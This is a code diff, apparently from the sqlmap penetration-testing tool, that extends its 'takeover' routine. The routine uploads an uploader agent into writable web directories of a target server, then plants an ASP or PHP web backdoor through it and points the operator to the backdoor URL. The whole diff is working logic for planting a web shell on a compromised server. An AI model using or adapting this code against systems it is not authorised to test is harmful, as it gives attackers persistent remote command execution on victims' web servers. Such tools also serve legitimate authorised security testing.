@@ -113,15 +113,14 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
 
     def __webBackdoorInit(self):
         """
-        This method is used to write a PHP agent (cmd.php) on a writable
+        This method is used to write a web backdoor (agent) on a writable
         remote directory within the web server document root.
-        Such agent is written using the INTO OUTFILE MySQL DBMS
-        functionality
         """
 
         self.checkDbmsOs()
 
         backdoorUrl = None
+        language    = None
         kb.docRoot  = getDocRoot()
         directories = getDirs()
         directories = list(directories)
@@ -130,11 +129,44 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
         infoMsg = "trying to upload the uploader agent"
         logger.info(infoMsg)
 
-        # TODO: backdoor and uploader extensions must be the same as of
-        # the web application language in use
-        backdoorName = "backdoor.php"
+        message  = "which web application language does the web server "
+        message += "support?\n"
+        message += "[1] ASP\n"
+        message += "[2] PHP (default)\n"
+        message += "[3] JSP"
+
+        while True:
+            choice = readInput(message, default="2")
+
+            if not choice or choice == "2":
+                language = "php"
+
+                break
+
+            elif choice == "1":
+                language = "asp"
+
+                break
+
+            elif choice == "3":
+                # TODO: add also JSP backdoor/uploader support
+                errMsg  = "JSP web backdoor functionality is not yet "
+                errMsg += "implemented"
+                raise sqlmapUnsupportedDBMSException, errMsg
+
+                #language = "jsp"
+
+                #break
+
+            elif not choice.isdigit():
+                logger.warn("invalid value, only digits are allowed")
+
+            elif int(choice) < 1 or int(choice) > 3:
+                logger.warn("invalid value, it must be 1 or 3")
+
+        backdoorName = "backdoor.%s" % language
         backdoorPath = "%s/%s" % (paths.SQLMAP_SHELL_PATH, backdoorName)
-        uploaderName = "uploader.php"
+        uploaderName = "uploader.%s" % language
         uploaderStr  = fileToStr("%s/%s" % (paths.SQLMAP_SHELL_PATH, uploaderName))
 
         for directory in directories:
@@ -165,25 +197,44 @@ class Takeover(Abstraction, DEP, Metasploit, Registry):
             logger.info(infoMsg)
 
             # Upload the backdoor through the uploader agent
-            multipartParams = {
-                                "upload":    "1",
-                                "file":      open(backdoorPath, "r"),
-                                "uploadDir": directory,
-                              }
-            page = Request.getPage(url=uploaderUrl, multipart=multipartParams)
+            if language == "php":
+                multipartParams = {
+                                    "upload":    "1",
+                                    "file":      open(backdoorPath, "r"),
+                                    "uploadDir": directory,
+                                  }
+                page = Request.getPage(url=uploaderUrl, multipart=multipartParams)
 
-            if "Backdoor uploaded" not in page:
-                warnMsg  = "unable to upload the backdoor through "
-                warnMsg += "the uploader agent on '%s'" % directory
-                logger.warn(warnMsg)
+                if "Backdoor uploaded" not in page:
+                    warnMsg  = "unable to upload the backdoor through "
+                    warnMsg += "the uploader agent on '%s'" % directory
+                    logger.warn(warnMsg)
 
-                continue
+                    continue
+
+            elif language == "asp":
+                backdoorRemotePath = "%s/%s" % (directory, backdoorName)
+                backdoorRemotePath = os.path.normpath(backdoorRemotePath)
+                backdoorContent = open(backdoorPath, "r").read()
+                postStr = "f=%s&d=%s" % (backdoorRemotePath, backdoorContent)
+                page, _ = Request.getPage(url=uploaderUrl, direct=True, post=postStr)
+
+                if "permission denied" in page.lower():
+                    warnMsg  = "unable to upload the backdoor through "
+                    warnMsg += "the uploader agent on '%s'" % directory
+                    logger.warn(warnMsg)
+
+                    continue
+
+            elif language == "jsp":
+                # TODO: add also JSP backdoor/uploader support
+                pass
 
             backdoorUrl = "%s/%s" % (baseUrl, backdoorName)
 
-            infoMsg  = "the backdoor has been successfully uploaded on "
-            infoMsg += "'%s', go with your browser to " % directory
-            infoMsg += "'%s' and enjoy it!" % backdoorUrl
+            infoMsg  = "the backdoor has probably been successfully "
+            infoMsg += "uploaded on '%s', go with your browser " % directory
+            infoMsg += "to '%s' and enjoy it!" % backdoorUrl
             logger.info(infoMsg)
 
             break
